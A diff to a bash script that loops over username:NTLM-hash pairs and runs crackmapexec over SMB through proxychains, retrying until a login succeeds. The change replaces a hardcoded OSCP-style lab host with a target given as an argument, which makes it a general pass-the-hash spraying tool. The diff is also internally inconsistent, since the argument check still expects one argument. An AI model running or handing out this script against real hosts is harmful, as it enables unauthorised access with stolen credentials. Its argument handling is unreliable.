@@ -2,7 +2,7 @@
 
 # Check if a file containing key-value pairs has been provided as argument
 if [ $# -ne 1 ]; then
-  echo "Usage: $0 <file>"
+  echo "Usage: $0 <file> <target>"
   exit 1
 fi
 
@@ -13,7 +13,7 @@ for option in $options; do
   key=$(echo "$option" | cut -d':' -f1)
   value=$(echo "$option" | cut -d':' -f2)
   while true; do
-    proxychains -q crackmapexec smb ms02.oscp.exam -u "$key" -H "$value"
+    proxychains -q crackmapexec smb $2 -u "$key" -H "$value"
     if [ $? -eq 0 ]; then
       break
     else
